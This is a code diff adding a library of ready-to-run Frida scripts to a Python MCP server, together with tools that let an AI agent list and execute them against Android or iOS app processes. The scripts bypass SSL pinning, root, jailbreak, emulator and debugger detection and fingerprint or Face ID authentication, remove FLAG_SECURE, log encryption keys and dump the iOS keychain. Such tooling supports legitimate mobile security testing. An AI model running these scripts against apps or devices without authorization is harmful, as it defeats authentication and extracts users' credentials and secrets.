@@ -2479,6 +2479,813 @@ def get_frida_version() -> Dict[str, Any]:
 
 
 # ============================================================================
+
+# ============================================================================
+# Phase 6: Custom Scripts Library
+# ============================================================================
+
+# Built-in scripts library - Most commonly used security bypass scripts
+CUSTOM_SCRIPTS_LIBRARY = {
+    # ==================== ANDROID SCRIPTS ====================
+    "ssl_pinning_bypass": {
+        "platform": "android",
+        "category": "bypass",
+        "description": "Universal SSL Pinning Bypass - Works on multiple libraries (OkHttp3, Trustkit, TrustManager, etc.)",
+        "author": "Maurizio Siddu",
+        "script": """
+Java.perform(function() {
+    console.log('[*] SSL Pinning Bypass - Loading...');
+    
+    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
+    var SSLContext = Java.use('javax.net.ssl.SSLContext');
+    
+    var TrustManager = Java.registerClass({
+        name: 'com.sslbypass.TrustManager',
+        implements: [X509TrustManager],
+        methods: {
+            checkClientTrusted: function(chain, authType) {},
+            checkServerTrusted: function(chain, authType) {},
+            getAcceptedIssuers: function() { return []; }
+        }
+    });
+    
+    var TrustManagers = [TrustManager.$new()];
+    var SSLContext_init = SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom');
+    
+    try {
+        SSLContext_init.implementation = function(keyManager, trustManager, secureRandom) {
+            console.log('[+] Bypassing TrustManager');
+            SSLContext_init.call(this, keyManager, TrustManagers, secureRandom);
+        };
+        console.log('[+] TrustManager bypass installed');
+    } catch(e) {
+        console.log('[-] TrustManager hook failed: ' + e);
+    }
+    
+    // OkHttp3 bypass
+    try {
+        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
+        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
+            console.log('[+] Bypassing OkHttp3 pinning for: ' + hostname);
+        };
+        console.log('[+] OkHttp3 bypass installed');
+    } catch(e) {
+        console.log('[-] OkHttp3 not found');
+    }
+    
+    // TrustManagerImpl bypass (Android 7+)
+    try {
+        var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
+        TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
+            console.log('[+] Bypassing TrustManagerImpl for: ' + host);
+            return untrustedChain;
+        };
+        console.log('[+] TrustManagerImpl bypass installed');
+    } catch(e) {
+        console.log('[-] TrustManagerImpl not found');
+    }
+    
+    console.log('[*] SSL Pinning Bypass - Active!');
+});
+"""
+    },
+    
+    "root_detection_bypass": {
+        "platform": "android",
+        "category": "bypass",
+        "description": "Root Detection Bypass - Hides root indicators from apps",
+        "author": "dzonerzy",
+        "script": """
+Java.perform(function() {
+    console.log('[*] Root Detection Bypass - Loading...');
+    
+    var RootPackages = ["com.noshufou.android.su", "eu.chainfire.supersu", "com.koushikdutta.superuser", 
+                        "com.thirdparty.superuser", "com.yellowes.su", "de.robv.android.xposed.installer",
+                        "com.saurik.substrate", "me.phh.superuser", "com.kingouser.com", "com.topjohnwu.magisk"];
+    
+    var RootBinaries = ["su", "busybox", "supersu", "Superuser.apk", "KingoUser.apk", "SuperSu.apk", "magisk"];
+    
+    // Hook PackageManager
+    try {
+        var PackageManager = Java.use("android.app.ApplicationPackageManager");
+        PackageManager.getPackageInfo.overload('java.lang.String', 'int').implementation = function(pname, flags) {
+            if (RootPackages.indexOf(pname) > -1) {
+                console.log('[+] Hiding root package: ' + pname);
+                pname = "com.fake.package";
+            }
+            return this.getPackageInfo(pname, flags);
+        };
+        console.log('[+] PackageManager hook installed');
+    } catch(e) {
+        console.log('[-] PackageManager hook failed: ' + e);
+    }
+    
+    // Hook File.exists
+    try {
+        var File = Java.use('java.io.File');
+        File.exists.implementation = function() {
+            var path = this.getAbsolutePath();
+            for (var i = 0; i < RootBinaries.length; i++) {
+                if (path.indexOf(RootBinaries[i]) > -1) {
+                    console.log('[+] Hiding root binary: ' + path);
+                    return false;
+                }
+            }
+            return this.exists();
+        };
+        console.log('[+] File.exists hook installed');
+    } catch(e) {
+        console.log('[-] File.exists hook failed: ' + e);
+    }
+    
+    // Hook Runtime.exec
+    try {
+        var Runtime = Java.use('java.lang.Runtime');
+        Runtime.exec.overload('java.lang.String').implementation = function(cmd) {
+            if (cmd.indexOf('su') > -1 || cmd.indexOf('which') > -1) {
+                console.log('[+] Blocking command: ' + cmd);
+                return this.exec('echo');
+            }
+            return this.exec(cmd);
+        };
+        console.log('[+] Runtime.exec hook installed');
+    } catch(e) {
+        console.log('[-] Runtime.exec hook failed: ' + e);
+    }
+    
+    console.log('[*] Root Detection Bypass - Active!');
+});
+"""
+    },
+    
+    "intercept_crypto": {
+        "platform": "android",
+        "category": "tracer",
+        "description": "Intercept cryptographic operations - Logs keys, algorithms and data",
+        "author": "@fadeevab",
+        "script": """
+Java.perform(function() {
+    console.log('[*] Crypto Interceptor - Loading...');
+    
+    function toHex(arr) {
+        var result = '';
+        for (var i = 0; i < arr.length; i++) {
+            result += ('0' + (arr[i] & 0xFF).toString(16)).slice(-2);
+        }
+        return result;
+    }
+    
+    function toAscii(arr) {
+        var result = '';
+        for (var i = 0; i < arr.length; i++) {
+            var c = arr[i] & 0xFF;
+            result += (c >= 32 && c <= 126) ? String.fromCharCode(c) : '.';
+        }
+        return result;
+    }
+    
+    // SecretKeySpec - capture encryption keys
+    try {
+        var SecretKeySpec = Java.use('javax.crypto.spec.SecretKeySpec');
+        SecretKeySpec.$init.overload('[B', 'java.lang.String').implementation = function(key, algo) {
+            console.log('[CRYPTO] SecretKeySpec');
+            console.log('  Algorithm: ' + algo);
+            console.log('  Key (hex): ' + toHex(key));
+            console.log('  Key (ascii): ' + toAscii(key));
+            return this.$init(key, algo);
+        };
+        console.log('[+] SecretKeySpec hook installed');
+    } catch(e) {
+        console.log('[-] SecretKeySpec hook failed: ' + e);
+    }
+    
+    // Cipher.getInstance
+    try {
+        var Cipher = Java.use('javax.crypto.Cipher');
+        Cipher.getInstance.overload('java.lang.String').implementation = function(transformation) {
+            console.log('[CRYPTO] Cipher.getInstance: ' + transformation);
+            return this.getInstance(transformation);
+        };
+        console.log('[+] Cipher.getInstance hook installed');
+    } catch(e) {
+        console.log('[-] Cipher.getInstance hook failed: ' + e);
+    }
+    
+    // Cipher.doFinal
+    try {
+        var Cipher = Java.use('javax.crypto.Cipher');
+        Cipher.doFinal.overload('[B').implementation = function(data) {
+            var result = this.doFinal(data);
+            console.log('[CRYPTO] Cipher.doFinal');
+            console.log('  Input (hex): ' + toHex(data));
+            console.log('  Output (hex): ' + toHex(result));
+            return result;
+        };
+        console.log('[+] Cipher.doFinal hook installed');
+    } catch(e) {
+        console.log('[-] Cipher.doFinal hook failed: ' + e);
+    }
+    
+    console.log('[*] Crypto Interceptor - Active!');
+});
+"""
+    },
+    
+    "emulator_detection_bypass": {
+        "platform": "android",
+        "category": "bypass",
+        "description": "Emulator Detection Bypass (BluePill) - Makes emulator appear as real device",
+        "author": "@Areizen_",
+        "script": """
+Java.perform(function() {
+    console.log('[*] Emulator Detection Bypass - Loading...');
+    
+    // Spoof Build properties
+    try {
+        var Build = Java.use('android.os.Build');
+        var Field = Java.use('java.lang.reflect.Field');
+        
+        function setField(obj, name, value) {
+            var field = obj.class.getDeclaredField(name);
+            field.setAccessible(true);
+            field.set(null, value);
+        }
+        
+        setField(Build, 'FINGERPRINT', 'google/oriole/oriole:14/AP1A.240405.002/11480754:user/release-keys');
+        setField(Build, 'MODEL', 'Pixel 6');
+        setField(Build, 'MANUFACTURER', 'Google');
+        setField(Build, 'BRAND', 'google');
+        setField(Build, 'BOARD', 'oriole');
+        setField(Build, 'HARDWARE', 'oriole');
+        setField(Build, 'PRODUCT', 'oriole');
+        console.log('[+] Build properties spoofed');
+    } catch(e) {
+        console.log('[-] Build spoof failed: ' + e);
+    }
+    
+    // Spoof TelephonyManager
+    try {
+        var TelephonyManager = Java.use('android.telephony.TelephonyManager');
+        TelephonyManager.getDeviceId.overload().implementation = function() {
+            console.log('[+] Spoofing DeviceId');
+            return '358240051111110';
+        };
+        TelephonyManager.getSubscriberId.overload().implementation = function() {
+            console.log('[+] Spoofing SubscriberId');
+            return '310260000000000';
+        };
+        TelephonyManager.getLine1Number.overload().implementation = function() {
+            console.log('[+] Spoofing PhoneNumber');
+            return '+15551234567';
+        };
+        console.log('[+] TelephonyManager hooks installed');
+    } catch(e) {
+        console.log('[-] TelephonyManager hooks failed: ' + e);
+    }
+    
+    console.log('[*] Emulator Detection Bypass - Active!');
+});
+"""
+    },
+    
+    "debugger_bypass": {
+        "platform": "android",
+        "category": "bypass",
+        "description": "Debugger Detection Bypass - Hides debugger from anti-tampering checks",
+        "author": "RMS",
+        "script": """
+Java.perform(function() {
+    console.log('[*] Debugger Detection Bypass - Loading...');
+    
+    try {
+        var Debug = Java.use('android.os.Debug');
+        Debug.isDebuggerConnected.implementation = function() {
+            console.log('[+] Hiding debugger (isDebuggerConnected)');
+            return false;
+        };
+        console.log('[+] Debug.isDebuggerConnected hook installed');
+    } catch(e) {
+        console.log('[-] Debug hook failed: ' + e);
+    }
+    
+    try {
+        var Debug = Java.use('android.os.Debug');
+        Debug.waitingForDebugger.implementation = function() {
+            console.log('[+] Hiding debugger (waitingForDebugger)');
+            return false;
+        };
+        console.log('[+] Debug.waitingForDebugger hook installed');
+    } catch(e) {
+        console.log('[-] waitingForDebugger hook failed: ' + e);
+    }
+    
+    console.log('[*] Debugger Detection Bypass - Active!');
+});
+"""
+    },
+    
+    "fingerprint_bypass": {
+        "platform": "android",
+        "category": "bypass",
+        "description": "Fingerprint Authentication Bypass - Automatically authenticates fingerprint",
+        "author": "RMS",
+        "script": """
+Java.perform(function() {
+    console.log('[*] Fingerprint Bypass - Loading...');
+    
+    try {
+        var FingerprintManager = Java.use('android.hardware.fingerprint.FingerprintManager');
+        FingerprintManager.authenticate.implementation = function(crypto, cancel, flags, callback, handler) {
+            console.log('[+] Fingerprint authenticate intercepted');
+            
+            // Get AuthenticationResult class
+            var AuthenticationResult = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationResult');
+            var CryptoObject = Java.use('android.hardware.fingerprint.FingerprintManager$CryptoObject');
+            
+            // Call onAuthenticationSucceeded
+            callback.onAuthenticationSucceeded(null);
+            console.log('[+] Fingerprint bypass triggered!');
+        };
+        console.log('[+] FingerprintManager hook installed');
+    } catch(e) {
+        console.log('[-] FingerprintManager hook failed: ' + e);
+    }
+    
+    // BiometricPrompt (Android 9+)
+    try {
+        var BiometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt');
+        BiometricPrompt.authenticate.overload('android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback').implementation = function(cancel, executor, callback) {
+            console.log('[+] BiometricPrompt authenticate intercepted');
+            callback.onAuthenticationSucceeded(null);
+            console.log('[+] BiometricPrompt bypass triggered!');
+        };
+        console.log('[+] BiometricPrompt hook installed');
+    } catch(e) {
+        console.log('[-] BiometricPrompt not available');
+    }
+    
+    console.log('[*] Fingerprint Bypass - Active!');
+});
+"""
+    },
+    
+    "flag_secure_bypass": {
+        "platform": "android",
+        "category": "bypass",
+        "description": "FLAG_SECURE Bypass - Allows screenshots on protected screens",
+        "author": "RMS",
+        "script": """
+Java.perform(function() {
+    console.log('[*] FLAG_SECURE Bypass - Loading...');
+    
+    try {
+        var Window = Java.use('android.view.Window');
+        Window.setFlags.implementation = function(flags, mask) {
+            var FLAG_SECURE = 0x00002000;
+            if ((flags & FLAG_SECURE) != 0) {
+                console.log('[+] Removing FLAG_SECURE');
+                flags &= ~FLAG_SECURE;
+            }
+            this.setFlags(flags, mask);
+        };
+        console.log('[+] Window.setFlags hook installed');
+    } catch(e) {
+        console.log('[-] setFlags hook failed: ' + e);
+    }
+    
+    try {
+        var SurfaceView = Java.use('android.view.SurfaceView');
+        SurfaceView.setSecure.implementation = function(isSecure) {
+            console.log('[+] Bypassing SurfaceView.setSecure');
+            this.setSecure(false);
+        };
+        console.log('[+] SurfaceView.setSecure hook installed');
+    } catch(e) {
+        console.log('[-] SurfaceView hook failed: ' + e);
+    }
+    
+    console.log('[*] FLAG_SECURE Bypass - Active!');
+});
+"""
+    },
+
+    # ==================== iOS SCRIPTS ====================
+    "ios_ssl_pinning_bypass": {
+        "platform": "ios",
+        "category": "bypass",
+        "description": "iOS SSL Pinning Bypass - Works on iOS 12-17 using libboringssl",
+        "author": "Federico Dotta",
+        "script": """
+try {
+    Module.ensureInitialized("libboringssl.dylib");
+} catch(err) {
+    console.log("Loading libboringssl.dylib...");
+    Module.load("libboringssl.dylib");
+}
+
+var SSL_VERIFY_NONE = 0;
+
+var ssl_set_custom_verify = new NativeFunction(
+    Module.findExportByName("libboringssl.dylib", "SSL_set_custom_verify"),
+    'void', ['pointer', 'int', 'pointer']
+);
+
+var ssl_get_psk_identity = new NativeFunction(
+    Module.findExportByName("libboringssl.dylib", "SSL_get_psk_identity"),
+    'pointer', ['pointer']
+);
+
+var ssl_verify_result_t = new NativeCallback(function(ssl, out_alert) {
+    return SSL_VERIFY_NONE;
+}, 'int', ['pointer', 'pointer']);
+
+Interceptor.replace(ssl_set_custom_verify, new NativeCallback(function(ssl, mode, callback) {
+    console.log('[+] Bypassing SSL verification');
+    ssl_set_custom_verify(ssl, mode, ssl_verify_result_t);
+}, 'void', ['pointer', 'int', 'pointer']));
+
+Interceptor.replace(ssl_get_psk_identity, new NativeCallback(function(ssl) {
+    return Memory.allocUtf8String("notarealPSKidentity");
+}, 'pointer', ['pointer']));
+
+console.log('[*] iOS SSL Pinning Bypass - Active!');
+"""
+    },
+    
+    "ios_jailbreak_bypass": {
+        "platform": "ios",
+        "category": "bypass",
+        "description": "iOS Jailbreak Detection Bypass - Hides jailbreak indicators",
+        "author": "@chaitin",
+        "script": """
+var paths = [
+    '/Applications/Cydia.app', '/Applications/FakeCarrier.app', '/Applications/Icy.app',
+    '/Applications/SBSettings.app', '/Applications/WinterBoard.app', '/Applications/blackra1n.app',
+    '/Library/MobileSubstrate/MobileSubstrate.dylib', '/bin/bash', '/bin/sh',
+    '/etc/apt', '/etc/ssh/sshd_config', '/private/var/lib/apt', '/private/var/lib/cydia',
+    '/private/var/stash', '/usr/bin/sshd', '/usr/sbin/sshd', '/var/lib/cydia',
+    '/usr/libexec/sftp-server', '/private/jailbreak.txt'
+];
+
+if (ObjC.available) {
+    console.log('[*] iOS Jailbreak Bypass - Loading...');
+    
+    // Hook open
+    Interceptor.attach(Module.findExportByName(null, 'open'), {
+        onEnter: function(args) {
+            if (!args[0]) return;
+            var path = args[0].readUtf8String();
+            if (paths.indexOf(path) > -1) {
+                console.log('[+] Hiding jailbreak path: ' + path);
+                args[0].writeUtf8String('/nonexistent' + path);
+            }
+        }
+    });
+    
+    // Hook stat
+    Interceptor.attach(Module.findExportByName(null, 'stat'), {
+        onEnter: function(args) {
+            if (!args[0]) return;
+            var path = args[0].readUtf8String();
+            if (paths.indexOf(path) > -1) {
+                console.log('[+] Hiding jailbreak stat: ' + path);
+                args[0].writeUtf8String('/nonexistent' + path);
+            }
+        }
+    });
+    
+    // Hook access
+    Interceptor.attach(Module.findExportByName(null, 'access'), {
+        onEnter: function(args) {
+            if (!args[0]) return;
+            var path = args[0].readUtf8String();
+            if (paths.indexOf(path) > -1) {
+                console.log('[+] Hiding jailbreak access: ' + path);
+                args[0].writeUtf8String('/nonexistent' + path);
+            }
+        }
+    });
+    
+    // Hook NSFileManager
+    try {
+        var NSFileManager = ObjC.classes.NSFileManager;
+        Interceptor.attach(NSFileManager['- fileExistsAtPath:'].implementation, {
+            onEnter: function(args) {
+                var path = ObjC.Object(args[2]).toString();
+                if (paths.indexOf(path) > -1) {
+                    console.log('[+] Hiding NSFileManager check: ' + path);
+                    args[2] = ObjC.classes.NSString.stringWithString_('/nonexistent');
+                }
+            }
+        });
+    } catch(e) {}
+    
+    console.log('[*] iOS Jailbreak Bypass - Active!');
+}
+"""
+    },
+    
+    "ios_touch_id_bypass": {
+        "platform": "ios",
+        "category": "bypass",
+        "description": "iOS Touch ID / Face ID Bypass - Automatically authenticates biometrics",
+        "author": "RMS",
+        "script": """
+if (ObjC.available) {
+    console.log('[*] Touch ID / Face ID Bypass - Loading...');
+    
+    try {
+        var LAContext = ObjC.classes.LAContext;
+        
+        // Hook evaluatePolicy
+        Interceptor.attach(LAContext['- evaluatePolicy:localizedReason:reply:'].implementation, {
+            onEnter: function(args) {
+                console.log('[+] LAContext.evaluatePolicy intercepted');
+                var reply = new ObjC.Block(args[4]);
+                var origReply = reply.implementation;
+                
+                reply.implementation = function(success, error) {
+                    console.log('[+] Bypassing biometric authentication');
+                    origReply(true, null);
+                };
+            }
+        });
+        
+        console.log('[+] LAContext hook installed');
+    } catch(e) {
+        console.log('[-] LAContext hook failed: ' + e);
+    }
+    
+    console.log('[*] Touch ID / Face ID Bypass - Active!');
+}
+"""
+    },
+    
+    "ios_keychain_dump": {
+        "platform": "ios",
+        "category": "dump",
+        "description": "iOS Keychain Dump - Extracts all keychain items",
+        "author": "RMS",
+        "script": """
+if (ObjC.available) {
+    console.log('[*] Keychain Dump - Starting...');
+    
+    var kSecClass = ObjC.classes.__NSCFConstantString.stringWithString_('kSecClass');
+    var kSecReturnAttributes = ObjC.classes.__NSCFConstantString.stringWithString_('kSecReturnAttributes');
+    var kSecReturnData = ObjC.classes.__NSCFConstantString.stringWithString_('kSecReturnData');
+    var kSecMatchLimit = ObjC.classes.__NSCFConstantString.stringWithString_('kSecMatchLimit');
+    
+    var classes = ['genp', 'inet', 'cert', 'keys'];
+    
+    classes.forEach(function(secClass) {
+        console.log('\\n=== Keychain Class: ' + secClass + ' ===');
+        
+        var query = ObjC.classes.NSMutableDictionary.alloc().init();
+        query.setObject_forKey_(secClass, 'class');
+        query.setObject_forKey_(true, 'r_Attributes');
+        query.setObject_forKey_(true, 'r_Data');
+        query.setObject_forKey_('m_LimitAll', 'm_Limit');
+        
+        var result = Memory.alloc(Process.pointerSize);
+        
+        var status = ObjC.classes.NSObject.SecItemCopyMatching_(query, result);
+        
+        if (status == 0) {
+            var items = new ObjC.Object(result.readPointer());
+            console.log('Found ' + items.count() + ' items');
+            
+            for (var i = 0; i < items.count(); i++) {
+                var item = items.objectAtIndex_(i);
+                console.log(item.toString());
+            }
+        }
+    });
+    
+    console.log('\\n[*] Keychain Dump - Complete!');
+}
+"""
+    }
+}
+
+
+@mcp.tool()
+def list_custom_scripts(
+    platform: Optional[str] = None,
+    category: Optional[str] = None
+) -> Dict[str, Any]:
+    """
+    List all available custom scripts in the library.
+    
+    Args:
+        platform: Filter by platform ("android" or "ios"). None for all.
+        category: Filter by category ("bypass", "tracer", "dump"). None for all.
+    
+    Returns:
+        Dictionary with available scripts and their descriptions.
+    
+    Available categories:
+        - bypass: Security bypass scripts (SSL pinning, root detection, etc.)
+        - tracer: Tracing/monitoring scripts (crypto intercept, etc.)
+        - dump: Data extraction scripts (keychain dump, etc.)
+    """
+    scripts = {}
+    
+    for name, info in CUSTOM_SCRIPTS_LIBRARY.items():
+        # Apply filters
+        if platform and info["platform"] != platform.lower():
+            continue
+        if category and info["category"] != category.lower():
+            continue
+        
+        scripts[name] = {
+            "platform": info["platform"],
+            "category": info["category"],
+            "description": info["description"],
+            "author": info["author"]
+        }
+    
+    return {
+        "status": "success",
+        "scriptCount": len(scripts),
+        "scripts": scripts,
+        "filters": {
+            "platform": platform,
+            "category": category
+        }
+    }
+
+
+@mcp.tool()
+def run_custom_script(
+    target: str,
+    script_name: str,
+    device: Optional[str] = None
+) -> Dict[str, Any]:
+    """
+    Run a custom script from the built-in library.
+    
+    Args:
+        target: Process name or PID to attach to
+        script_name: Name of the script to run (from list_custom_scripts)
+        device: Device identifier
+    
+    Returns:
+        Dictionary with script execution results
+    
+    Example:
+        # Bypass SSL pinning
+        run_custom_script(
+            target="com.example.app",
+            script_name="ssl_pinning_bypass",
+            device="192.168.4.220:9999"
+        )
+        
+        # Bypass root detection
+        run_custom_script(
+            target=12345,
+            script_name="root_detection_bypass",
+            device="usb"
+        )
+    """
+    if script_name not in CUSTOM_SCRIPTS_LIBRARY:
+        available = list(CUSTOM_SCRIPTS_LIBRARY.keys())
+        return {
+            "status": "error",
+            "error": f"Script '{script_name}' not found",
+            "availableScripts": available
+        }
+    
+    script_info = CUSTOM_SCRIPTS_LIBRARY[script_name]
+    script_code = script_info["script"]
+    
+    # Execute the script
+    result = execute_script(
+        target=target,
+        script=script_code,
+        device=device,
+        timeout=60
+    )
+    
+    if result.get("status") == "success":
+        return {
+            "status": "success",
+            "scriptName": script_name,
+            "platform": script_info["platform"],
+            "category": script_info["category"],
+            "description": script_info["description"],
+            "output": result.get("output", ""),
+            "note": f"{script_name} is now active on target process"
+        }
+    else:
+        return {
+            "status": "error",
+            "scriptName": script_name,
+            "error": result.get("error") or result.get("output", "Unknown error")
+        }
+
+
+@mcp.tool()
+def load_script_from_file(
+    target: str,
+    script_path: str,
+    device: Optional[str] = None
+) -> Dict[str, Any]:
+    """
+    Load and execute a Frida script from a file.
+    
+    This allows you to run any custom .js script file, including the 
+    scripts from RMS's custom_scripts directory.
+    
+    Args:
+        target: Process name or PID to attach to
+        script_path: Path to the JavaScript file to execute
+        device: Device identifier
+    
+    Returns:
+        Dictionary with script execution results
+    
+    Example:
+        # Run RMS custom script
+        load_script_from_file(
+            target="com.example.app",
+            script_path="/path/to/RMS/custom_scripts/Android/ssl_pinning_multi_bypass.js",
+            device="192.168.4.220:9999"
+        )
+    """
+    try:
+        with open(script_path, 'r') as f:
+            script_code = f.read()
+    except FileNotFoundError:
+        return {
+            "status": "error",
+            "error": f"Script file not found: {script_path}"
+        }
+    except Exception as e:
+        return {
+            "status": "error",
+            "error": f"Error reading script file: {e}"
+        }
+    
+    # Execute the script
+    result = execute_script(
+        target=target,
+        script=script_code,
+        device=device,
+        timeout=60
+    )
+    
+    if result.get("status") == "success":
+        return {
+            "status": "success",
+            "scriptPath": script_path,
+            "scriptSize": len(script_code),
+            "output": result.get("output", ""),
+            "note": "Script loaded and executed successfully"
+        }
+    else:
+        return {
+            "status": "error",
+            "scriptPath": script_path,
+            "error": result.get("error") or result.get("output", "Unknown error")
+        }
+
+
+@mcp.tool()
+def get_script_code(
+    script_name: str
+) -> Dict[str, Any]:
+    """
+    Get the source code of a built-in script.
+    
+    Useful for reviewing what a script does before running it,
+    or for customizing the script.
+    
+    Args:
+        script_name: Name of the script (from list_custom_scripts)
+    
+    Returns:
+        Dictionary with script source code and metadata
+    """
+    if script_name not in CUSTOM_SCRIPTS_LIBRARY:
+        available = list(CUSTOM_SCRIPTS_LIBRARY.keys())
+        return {
+            "status": "error",
+            "error": f"Script '{script_name}' not found",
+            "availableScripts": available
+        }
+    
+    script_info = CUSTOM_SCRIPTS_LIBRARY[script_name]
+    
+    return {
+        "status": "success",
+        "scriptName": script_name,
+        "platform": script_info["platform"],
+        "category": script_info["category"],
+        "description": script_info["description"],
+        "author": script_info["author"],
+        "code": script_info["script"]
+    }
+
 # Main Entry Point
 # ============================================================================
 
